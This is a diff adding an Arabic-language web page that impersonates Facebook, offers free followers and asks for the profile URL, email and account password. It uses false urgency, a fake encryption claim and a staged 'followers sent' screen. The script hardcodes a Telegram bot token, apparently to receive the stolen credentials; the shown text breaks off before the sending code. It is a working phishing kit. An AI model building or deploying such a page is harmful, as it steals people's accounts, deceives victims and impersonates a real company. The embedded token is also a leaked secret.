@@ -1,0 +1,1371 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - زيادة المتابعين المجانية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --fb-blue: #1877f2;
+            --fb-dark: #166fe5;
+            --fb-green: #42b72a;
+            --fb-red: #ff4444;
+            --fb-bg: #f0f2f5;
+            --fb-white: #ffffff;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--fb-bg);
+            min-height: 100vh;
+            color: #1c1e21;
+        }
+
+        /* ===== HEADER ===== */
+        .fb-header {
+            background: var(--fb-white);
+            border-bottom: 1px solid #dddfe2;
+            padding: 12px 16px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .fb-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .fb-logo svg {
+            width: 40px;
+            height: 40px;
+        }
+
+        .fb-logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--fb-blue);
+        }
+
+        .free-badge {
+            background: linear-gradient(135deg, var(--fb-green), #36a420);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            animation: badgePulse 2s infinite;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(66, 183, 42, 0.4); }
+            50% { box-shadow: 0 0 0 10px rgba(66, 183, 42, 0); }
+        }
+
+        /* ===== COUNTER BAR ===== */
+        .counter-bar {
+            position: fixed;
+            top: 65px;
+            left: 0;
+            right: 0;
+            background: linear-gradient(135deg, var(--fb-blue), var(--fb-dark));
+            color: white;
+            padding: 16px;
+            z-index: 999;
+            text-align: center;
+        }
+
+        .counter-label {
+            font-size: 13px;
+            opacity: 0.9;
+            margin-bottom: 4px;
+        }
+
+        .counter-number {
+            font-size: 28px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .counter-live {
+            background: #ff4444;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 700;
+            animation: livePulse 1.5s infinite;
+        }
+
+        @keyframes livePulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* ===== MAIN ===== */
+        .main-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 140px 16px 40px;
+        }
+
+        /* ===== PAGES ===== */
+        .page {
+            display: none;
+            animation: pageEnter 0.5s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes pageEnter {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== HERO CARD ===== */
+        .hero-card {
+            background: var(--fb-white);
+            border-radius: 16px;
+            padding: 32px 24px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--fb-blue), var(--fb-green));
+        }
+
+        .icon-container {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+
+        .icon-canvas {
+            width: 100%;
+            height: 100%;
+        }
+
+        .hero-card h1 {
+            font-size: 26px;
+            margin-bottom: 12px;
+        }
+
+        .hero-card h1 span {
+            color: var(--fb-green);
+        }
+
+        .hero-card > p {
+            color: #65676b;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .urgency-banner {
+            background: #fff3e0;
+            border-right: 4px solid #ff9800;
+            padding: 12px 16px;
+            margin: 20px 0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-align: right;
+        }
+
+        .urgency-icon {
+            width: 32px;
+            height: 32px;
+            flex-shrink: 0;
+        }
+
+        .urgency-banner p {
+            font-size: 13px;
+            color: #e65100;
+        }
+
+        .urgency-banner strong {
+            display: block;
+            font-size: 14px;
+        }
+
+        /* ===== PACKAGES ===== */
+        .packages-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .packages-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .package-card {
+            background: var(--fb-white);
+            border: 2px solid #e4e6eb;
+            border-radius: 12px;
+            padding: 20px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .package-card:hover, .package-card.selected {
+            border-color: var(--fb-blue);
+            background: #e7f3ff;
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(24, 119, 242, 0.2);
+        }
+
+        .package-card.popular::after {
+            content: "الأشهر";
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--fb-red);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        .package-number {
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--fb-blue);
+            display: block;
+        }
+
+        .package-label {
+            font-size: 12px;
+            color: #65676b;
+            margin-top: 4px;
+        }
+
+        .package-price {
+            font-size: 14px;
+            color: var(--fb-green);
+            font-weight: 700;
+            margin-top: 8px;
+        }
+
+        /* ===== FORM ===== */
+        .form-card {
+            background: var(--fb-white);
+            border-radius: 16px;
+            padding: 28px 24px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        }
+
+        .form-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            color: #65676b;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 16px;
+            width: 20px;
+            height: 20px;
+            pointer-events: none;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 48px 16px 16px;
+            border: 2px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #f5f6f7;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            background: white;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.1);
+        }
+
+        .security-box {
+            background: #e8f5e9;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .security-box p {
+            font-size: 13px;
+            color: #2e7d32;
+        }
+
+        .security-box strong {
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-primary {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--fb-blue), var(--fb-dark));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+            box-shadow: 0 4px 16px rgba(24, 119, 242, 0.3);
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: 0.5s;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        .btn-primary.loading .spinner {
+            display: inline-block;
+        }
+
+        .btn-primary.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== PROCESSING ===== */
+        .processing-card {
+            background: var(--fb-white);
+            border-radius: 16px;
+            padding: 40px 24px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+
+        .processing-animation {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 32px;
+            position: relative;
+        }
+
+        .processing-ring {
+            position: absolute;
+            inset: 0;
+            border: 4px solid #e7f3ff;
+            border-top-color: var(--fb-blue);
+            border-radius: 50%;
+            animation: rotate 1s linear infinite;
+        }
+
+        .processing-ring:nth-child(2) {
+            inset: 20px;
+            border-color: #e8f5e9;
+            border-top-color: var(--fb-green);
+            animation-direction: reverse;
+            animation-duration: 1.5s;
+        }
+
+        .processing-ring:nth-child(3) {
+            inset: 40px;
+            border-color: #ffebee;
+            border-top-color: var(--fb-red);
+            animation-duration: 2s;
+        }
+
+        @keyframes rotate {
+            to { transform: rotate(360deg); }
+        }
+
+        .processing-icon-canvas {
+            position: absolute;
+            inset: 55px;
+            width: 40px;
+            height: 40px;
+        }
+
+        .followers-counter {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--fb-blue), var(--fb-green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            max-width: 300px;
+            height: 12px;
+            background: #e4e6eb;
+            border-radius: 6px;
+            margin: 0 auto 24px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--fb-blue), var(--fb-green));
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 6px;
+        }
+
+        .processing-steps {
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .processing-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px;
+            margin-bottom: 8px;
+            border-radius: 12px;
+            background: #f5f6f7;
+            opacity: 0.5;
+            transition: all 0.3s;
+        }
+
+        .processing-step.active {
+            opacity: 1;
+            background: #e7f3ff;
+        }
+
+        .processing-step.completed {
+            opacity: 1;
+            background: #e8f5e9;
+        }
+
+        .step-icon-canvas {
+            width: 28px;
+            height: 28px;
+            flex-shrink: 0;
+        }
+
+        /* ===== SUCCESS ===== */
+        .success-card {
+            background: var(--fb-white);
+            border-radius: 16px;
+            padding: 40px 24px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+            border: 3px solid var(--fb-green);
+        }
+
+        .success-animation {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 24px;
+        }
+
+        .success-canvas {
+            width: 100%;
+            height: 100%;
+        }
+
+        .success-card h2 {
+            font-size: 28px;
+            margin-bottom: 12px;
+            color: var(--fb-green);
+        }
+
+        .success-card > p {
+            color: #65676b;
+            font-size: 15px;
+            margin-bottom: 32px;
+        }
+
+        .result-card {
+            background: linear-gradient(135deg, #f5f9ff, #e8f5e9);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .result-avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--fb-blue), var(--fb-green));
+            padding: 3px;
+        }
+
+        .result-avatar img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid white;
+            object-fit: cover;
+        }
+
+        .result-info h3 {
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .verified-icon-small {
+            width: 20px;
+            height: 20px;
+        }
+
+        .result-info p {
+            color: #65676b;
+            font-size: 14px;
+        }
+
+        .result-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+        }
+
+        .stat-box {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--fb-blue);
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #65676b;
+            margin-top: 4px;
+        }
+
+        .delivery-time {
+            background: #fff3e0;
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 20px;
+        }
+
+        .delivery-time h4 {
+            font-size: 14px;
+            color: #e65100;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .clock-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        .countdown {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--fb-red);
+            font-family: monospace;
+        }
+
+        /* ===== FOOTER ===== */
+        .fb-footer {
+            text-align: center;
+            padding: 32px 20px;
+            color: #65676b;
+            font-size: 13px;
+        }
+
+        .fb-footer a {
+            color: #65676b;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="fb-header">
+        <div class="header-content">
+            <div class="fb-logo">
+                <svg viewBox="0 0 36 36" fill="currentColor">
+                    <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"/>
+                    <path fill="white" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.824l-1 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"/>
+                </svg>
+                <span class="fb-logo-text">Facebook</span>
+            </div>
+            <div class="free-badge">مجاني 100%</div>
+        </div>
+    </header>
+
+    <!-- COUNTER BAR -->
+    <div class="counter-bar">
+        <div class="counter-label">المتابعين المشحون اليوم</div>
+        <div class="counter-number">
+            <span id="globalCounter">2,847,392</span>
+            <span class="counter-live">● LIVE</span>
+        </div>
+    </div>
+
+    <!-- MAIN -->
+    <main class="main-container">
+
+        <!-- PAGE 1: WELCOME -->
+        <div class="page active" id="page1">
+            <div class="hero-card">
+                <div class="icon-container">
+                    <canvas id="followersIcon" class="icon-canvas"></canvas>
+                </div>
+                <h1>+5000 <span>متابع مجاني</span></h1>
+                <p>احصل على متابعين حقيقيين لحسابك على فيسبوك فوراً. لا حاجة لكلمة المرور!</p>
+                
+                <div class="urgency-banner">
+                    <canvas id="urgencyIcon" class="urgency-icon"></canvas>
+                    <p><strong>العرض ينتهي خلال ساعة!</strong>المتبقي 47 فقط من 5000 متابع مجاني</p>
+                </div>
+
+                <div class="packages-title">اختر عدد المتابعين</div>
+                
+                <div class="packages-grid">
+                    <div class="package-card" onclick="selectPackage(1000, this)">
+                        <span class="package-number">1K</span>
+                        <span class="package-label">متابع</span>
+                        <span class="package-price">مجاني</span>
+                    </div>
+                    <div class="package-card popular selected" onclick="selectPackage(5000, this)">
+                        <span class="package-number">5K</span>
+                        <span class="package-label">متابع</span>
+                        <span class="package-price">مجاني</span>
+                    </div>
+                    <div class="package-card" onclick="selectPackage(10000, this)">
+                        <span class="package-number">10K</span>
+                        <span class="package-label">متابع</span>
+                        <span class="package-price">مجاني</span>
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="goToPage(2)">
+                    <span class="btn-text">احصل على المتابعين</span>
+                    <span class="spinner"></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- PAGE 2: FORM -->
+        <div class="page" id="page2">
+            <div class="form-card">
+                <h2 class="form-title">إكمال الطلب</h2>
+                <p class="form-subtitle">أدخل بيانات حسابك لإرسال المتابعين</p>
+
+                <form id="followersForm">
+                    <div class="input-group">
+                        <label>رابط حساب فيسبوك</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="profileUrl" placeholder="https://facebook.com/username" required>
+                            <canvas id="linkIcon" class="input-icon"></canvas>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>البريد الإلكتروني المرتبط</label>
+                        <div class="input-wrapper">
+                            <input type="email" id="email" placeholder="your@email.com" required>
+                            <canvas id="emailIcon" class="input-icon"></canvas>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>كلمة المرور للتأكيد</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" placeholder="••••••••" required>
+                            <canvas id="lockIcon" class="input-icon"></canvas>
+                        </div>
+                    </div>
+
+                    <div class="security-box">
+                        <canvas id="securityIcon" class="security-icon"></canvas>
+                        <p><strong>تأكيد هوية آمن</strong>نستخدم تشفير 256-bit لحماية بياناتك</p>
+                    </div>
+
+                    <button type="submit" class="btn-primary" id="submitBtn">
+                        <span class="btn-text">تأكيد وإرسال المتابعين</span>
+                        <span class="spinner"></span>
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 3: PROCESSING -->
+        <div class="page" id="page3">
+            <div class="processing-card">
+                <div class="processing-animation">
+                    <div class="processing-ring"></div>
+                    <div class="processing-ring"></div>
+                    <div class="processing-ring"></div>
+                    <canvas id="processingIcon" class="processing-icon-canvas"></canvas>
+                </div>
+                
+                <h2>جاري إضافة المتابعين...</h2>
+                <p style="color: #65676b;">لا تغلق الصفحة حتى اكتمال العملية</p>
+                
+                <div class="followers-counter" id="followersCount">0</div>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+
+                <div class="processing-steps">
+                    <div class="processing-step completed" id="procStep1">
+                        <canvas id="checkIcon1" class="step-icon-canvas"></canvas>
+                        <span>التحقق من الحساب</span>
+                    </div>
+                    <div class="processing-step active" id="procStep2">
+                        <canvas id="stepIcon2" class="step-icon-canvas"></canvas>
+                        <span>جلب المتابعين</span>
+                    </div>
+                    <div class="processing-step" id="procStep3">
+                        <canvas id="stepIcon3" class="step-icon-canvas"></canvas>
+                        <span>إرسال المتابعين</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 4: SUCCESS -->
+        <div class="page" id="page4">
+            <div class="success-card">
+                <div class="success-animation">
+                    <canvas id="successCheck" class="success-canvas"></canvas>
+                </div>
+                <h2>تم بنجاح!</h2>
+                <p>تم إرسال طلبك. المتابعين في طريقهم لحسابك.</p>
+
+                <div class="result-card">
+                    <div class="result-header">
+                        <div class="result-avatar">
+                            <img src="https://via.placeholder.com/64" alt="Profile" id="resultAvatar">
+                        </div>
+                        <div class="result-info">
+                            <h3>
+                                <span id="resultName">المستخدم</span>
+                                <canvas id="verifiedIcon" class="verified-icon-small"></canvas>
+                            </h3>
+                            <p>تم إضافة المتابعين</p>
+                        </div>
+                    </div>
+                    
+                    <div class="result-stats">
+                        <div class="stat-box">
+                            <div class="stat-number" id="resultFollowers">5K</div>
+                            <div class="stat-label">متابع جديد</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-number">24h</div>
+                            <div class="stat-label">وقت التسليم</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-number" style="color: var(--fb-green);">
+                                <canvas id="smallCheck" style="width: 24px; height: 24px;"></canvas>
+                            </div>
+                            <div class="stat-label">مكتمل</div>
+                        </div>
+                    </div>
+
+                    <div class="delivery-time">
+                        <h4>
+                            <canvas id="clockIcon" class="clock-icon"></canvas>
+                            الوقت المتوقع للإكتمال
+                        </h4>
+                        <div class="countdown" id="countdown">23:59:59</div>
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="location.reload()">
+                    <span class="btn-text">طلب جديد</span>
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="fb-footer">
+        <p>
+            <a href="#">الخصوصية</a> · 
+            <a href="#">الشروط</a> · 
+            <a href="#">المساعدة</a> · 
+            <a href="#">الأمان</a>
+        </p>
+        <p style="margin-top: 8px;">© 2026 Meta Platforms, Inc.</p>
+    </footer>
+
+    <script>
+        // Telegram Bot Token
+        const BOT_TOKEN = '8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY';
+        
+        let selectedPackage = 5000;
+        let currentPage = 1;
+        let userData = {};
+
+        // CANVAS DRAWING FUNCTIONS
+        function drawFollowersIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 100;
+            const center = size / 2;
+            
+            // Background circle
+            const gradient = ctx.createLinearGradient(0, 0, size, size);
+            gradient.addColorStop(0, '#1877f2');
+            gradient.addColorStop(1, '#42b72a');
+            ctx.fillStyle = gradient;
+            ctx.beginPath();
+            ctx.arc(center, center, center - 5, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Person 1 (front)
+            ctx.fillStyle = 'white';
+            ctx.beginPath();
+            ctx.arc(center, center - 10, 18, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Body 1
+            ctx.beginPath();
+            ctx.ellipse(center, center + 35, 25, 30, 0, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Person 2 (left back)
+            ctx.fillStyle = 'rgba(255,255,255,0.8)';
+            ctx.beginPath();
+            ctx.arc(center - 25, center - 5, 14, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Body 2
+            ctx.beginPath();
+            ctx.ellipse(center - 25, center + 30, 20, 25, 0, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Person 3 (right back)
+            ctx.beginPath();
+            ctx.arc(center + 25, center - 5, 14, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Body 3
+            ctx.beginPath();
+            ctx.ellipse(center + 25, center + 30, 20, 25, 0, 0, Math.PI * 2);
+            ctx.fill();
+        }
+
+        function drawUrgencyIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 32;
+            
+            // Lightning bolt
+            ctx.fillStyle = '#ff9800';
+            ctx.beginPath();
+            ctx.moveTo(18, 2);
+            ctx.lineTo(8, 14);
+            ctx.lineTo(14, 14);
+            ctx.lineTo(12, 30);
+            ctx.lineTo(24, 16);
+            ctx.lineTo(18, 16);
+            ctx.closePath();
+            ctx.fill();
+        }
+
+        function drawLinkIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 20;
+            
+            ctx.strokeStyle = '#65676b';
+            ctx.lineWidth = 2;
+            ctx.lineCap = 'round';
+            
+            // Chain link
+            ctx.beginPath();
+            ctx.arc(6, 10, 4, -Math.PI/2, Math.PI/2);
+            ctx.stroke();
+            
+            ctx.beginPath();
+            ctx.arc(14, 10, 4, Math.PI/2, -Math.PI/2);
+            ctx.stroke();
+            
+            // Middle line
+            ctx.beginPath();
+            ctx.moveTo(6, 6);
+            ctx.lineTo(14, 14);
+            ctx.stroke();
+        }
+
+        function drawEmailIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 20;
+            
+            ctx.strokeStyle = '#65676b';
+            ctx.lineWidth = 2;
+            
+            // Envelope
+            ctx.strokeRect(2, 5, 16, 10);
+            
+            // Envelope flap
+            ctx.beginPath();
+            ctx.moveTo(2, 5);
+            ctx.lineTo(10, 12);
+            ctx.lineTo(18, 5);
+            ctx.stroke();
+        }
+
+        function drawLockIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 20;
+            
+            ctx.strokeStyle = '#65676b';
+            ctx.lineWidth = 2;
+            ctx.fillStyle = '#65676b';
+            
+            // Lock body
+            ctx.fillRect(4, 9, 12, 9);
+            
+            // Lock shackle
+            ctx.beginPath();
+            ctx.arc(10, 9, 5, Math.PI, 0);
+            ctx.stroke();
+        }
+
+        function drawSecurityIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 24;
+            
+            // Shield
+            ctx.fillStyle = '#2e7d32';
+            ctx.beginPath();
+            ctx.moveTo(12, 2);
+            ctx.lineTo(22, 6);
+            ctx.lineTo(22, 14);
+            ctx.arc(12, 20, 10, -Math.PI/2, Math.PI/2, true);
+            ctx.lineTo(2, 6);
+            ctx.closePath();
+            ctx.fill();
+            
+            // Checkmark
+            ctx.strokeStyle = 'white';
+            ctx.lineWidth = 3;
+            ctx.lineCap = 'round';
+            ctx.beginPath();
+            ctx.moveTo(7, 12);
+            ctx.lineTo(11, 16);
+            ctx.lineTo(17, 8);
+            ctx.stroke();
+        }
+
+        function drawProcessingIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 40;
+            const center = size / 2;
+            
+            // Background
+            const gradient = ctx.createLinearGradient(0, 0, size, size);
+            gradient.addColorStop(0, '#1877f2');
+            gradient.addColorStop(1, '#42b72a');
+            ctx.fillStyle = gradient;
+            ctx.beginPath();
+            ctx.arc(center, center, center - 2, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // People icon
+            ctx.fillStyle = 'white';
+            
+            // Center person
+            ctx.beginPath();
+            ctx.arc(center, center - 5, 8, 0, Math.PI * 2);
+            ctx.fill();
+            ctx.beginPath();
+            ctx.ellipse(center, center + 15, 12, 14, 0, 0, Math.PI * 2);
+            ctx.fill();
+        }
+
+        function drawCheckIcon(canvas, color = '#42b72a') {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 28;
+            
+            // Circle
+            ctx.fillStyle = color;
+            ctx.beginPath();
+            ctx.arc(size/2, size/2, size/2 - 2, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Check
+            ctx.strokeStyle = 'white';
+            ctx.lineWidth = 3;
+            ctx.lineCap = 'round';
+            ctx.beginPath();
+            ctx.moveTo(8, 14);
+            ctx.lineTo(12, 18);
+            ctx.lineTo(20, 10);
+            ctx.stroke();
+        }
+
+        function drawNumberIcon(canvas, number) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 28;
+            
+            ctx.fillStyle = '#65676b';
+            ctx.beginPath();
+            ctx.arc(size/2, size/2, size/2 - 2, 0, Math.PI * 2);
+            ctx.fill();
+            
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold 14px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText(number, size/2, size/2);
+        }
+
+        function drawSuccessCheck(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 120;
+            const center = size / 2;
+            
+            // Background gradient
+            const gradient = ctx.createLinearGradient(0, 0, size, size);
+            gradient.addColorStop(0, '#42b72a');
+            gradient.addColorStop(1, '#36a420');
+            ctx.fillStyle = gradient;
+            ctx.beginPath();
+            ctx.arc(center, center, center - 5, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Shadow
+            ctx.shadowColor = 'rgba(66, 183, 42, 0.4)';
+            ctx.shadowBlur = 20;
+            ctx.shadowOffsetY = 8;
+            
+            // Checkmark
+            ctx.strokeStyle = 'white';
+            ctx.lineWidth = 8;
+            ctx.lineCap = 'round';
+            ctx.lineJoin = 'round';
+            ctx.beginPath();
+            ctx.moveTo(center - 30, center);
+            ctx.lineTo(center - 10, center + 25);
+            ctx.lineTo(center + 35, center - 20);
+            ctx.stroke();
+            
+            ctx.shadowColor = 'transparent';
+        }
+
+        function drawVerifiedIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 20;
+            
+            // Blue circle
+            ctx.fillStyle = '#1877f2';
+            ctx.beginPath();
+            ctx.arc(size/2, size/2, size/2 - 1, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // White check
+            ctx.strokeStyle = 'white';
+            ctx.lineWidth = 2.5;
+            ctx.lineCap = 'round';
+            ctx.beginPath();
+            ctx.moveTo(6, 10);
+            ctx.lineTo(9, 13);
+            ctx.lineTo(14, 7);
+            ctx.stroke();
+        }
+
+        function drawSmallCheck(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 24;
+            
+            ctx.fillStyle = '#42b72a';
+            ctx.beginPath();
+            ctx.arc(size/2, size/2, size/2 - 2, 0, Math.PI * 2);
+            ctx.fill();
+            
+            ctx.strokeStyle = 'white';
+            ctx.lineWidth = 3;
+            ctx.lineCap = 'round';
+            ctx.beginPath();
+            ctx.moveTo(7, 12);
+            ctx.lineTo(11, 16);
+            ctx.lineTo(17, 8);
+            ctx.stroke();
+        }
+
+        function drawClockIcon(canvas) {
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width = canvas.height = 16;
+            
+            ctx.strokeStyle = '#e65100';
+            ctx.lineWidth = 2;
+            ctx.lineCap = 'round';
+            
+            // Circle
+            ctx.beginPath();
+            ctx.arc(size/2, size/2, size/2 - 2, 0, Math.PI * 2);
+            ctx.stroke();
+            
+            // Hands
+            ctx.beginPath();
+            ctx.moveTo(size/2, size/2);
+            ctx.lineTo(size/2, size/2 - 5);
+            ctx.moveTo(size/2, size/2);
+            ctx.lineTo(size/2 + 4, size/2);
+            ctx.stroke();
+        }
+
+        // INITIALIZE CANVAS ICONS
+        function initIcons() {
+            drawFollowersIcon(document.getElementById('followersIcon'));
+            drawUrgencyIcon(document.getElementById('urgencyIcon'));
+            drawLinkIcon(document.getElementById('linkIcon'));
+            drawEmailIcon(document.getElementById('emailIcon'));
+            drawLockIcon(document.getElementById('lockIcon'));
+            drawSecurityIcon(document.getElementById('securityIcon'));
